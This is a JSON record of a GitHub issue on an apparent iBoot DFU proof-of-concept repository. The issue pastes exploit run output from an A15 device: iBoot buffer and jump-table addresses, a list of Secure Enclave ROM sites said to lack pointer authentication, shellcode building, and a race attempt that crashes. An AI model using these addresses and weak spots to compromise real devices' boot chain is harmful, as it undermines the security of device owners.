@@ -1,0 +1,39 @@
+{
+ "source": "GitHub",
+ "url": "https://github.com/ncxcy/A14-A16-iBoot-DFU-PoC/issues/1",
+ "passes": [
+  "main"
+ ],
+ "title": "1st test",
+ "author_login": "iosEXfrp",
+ "status": "ok",
+ "fetched_utc": "2026-10-07T04:20:02Z",
+ "final_url": "https://github.com/ncxcy/A14-A16-iBoot-DFU-PoC/issues/1",
+ "repo": "ncxcy/A14-A16-iBoot-DFU-PoC",
+ "repo_language": "C",
+ "number": 1,
+ "state": "open",
+ "state_reason": null,
+ "created_at": "2026-10-01T14:43:12Z",
+ "updated_at": "2026-10-01T14:43:12Z",
+ "closed_at": null,
+ "labels": [],
+ "comments_reported": 0,
+ "query_buckets": [
+  "763"
+ ],
+ "events": [
+  {
+   "post_type": "issue_body",
+   "post_id": "-",
+   "author_login": "iosEXfrp",
+   "author_association": "NONE",
+   "role": "R",
+   "role_name": "reporter",
+   "created_utc": "2026-10-01T14:43:12Z",
+   "updated_utc": "2026-10-01T14:43:12Z",
+   "permalink": "https://github.com/ncxcy/A14-A16-iBoot-DFU-PoC/issues/1",
+   "body_markdown": "./poc         \npoc: iboot dfu jtbl and sep vuln map\ni tested on A15 Bionic\niboot findings:\n  dfu buf:     0x0000000002006500\n  jtbl base:   0x000000086bb2be5c\n  jtbl table:  0x000000086bb2c0a8\n  exec fn:     0x000000086bab9388\n\nsep vuln map:\n  vuln seprom1 jtbl br sites (no pac):\n    0x0028f4  0x006384  0x006ccc  0x009710  0x00cdfc\n    0x010e6c  0x014038  0x024654  0x024850  0x0249bc\n  vuln seprom2 unprotected ret (no pacibsp): 109 sites\n  vuln seprom3 mbox mmio:\n    tx  0x5d080000\n    rx  0x5d040000\n    aes 0x5c100000\n  vuln seprom4 vecttbl inline code at 0x01e780\n  vuln seprom5 loop candidates 0x0035e4  0x0048b4\n\nbuilding shellcode...\nshellcode: 188 bytes\nlooking for dfu device 05ac:1227...\ndevice vid=05ac pid=1227 serial=SDOM:01 CPID:8110 CPRV:11 CPFM:03 SCEP:01 BDID:18 ECID:00121........E IBFL:3C SRTG:[iBoot-6338.0.0.200.19]\n\nrunning race 5000 iters...\npoc(5205,0x7ff847edc100) malloc: *** error for object 0x600003b78000: pointer being freed was not allocated\npoc(5205,0x7ff847edc100) malloc: *** set a breakpoint in malloc_error_break to debug\nzsh: abort      ./poc\n"
+  }
+ ]
+}
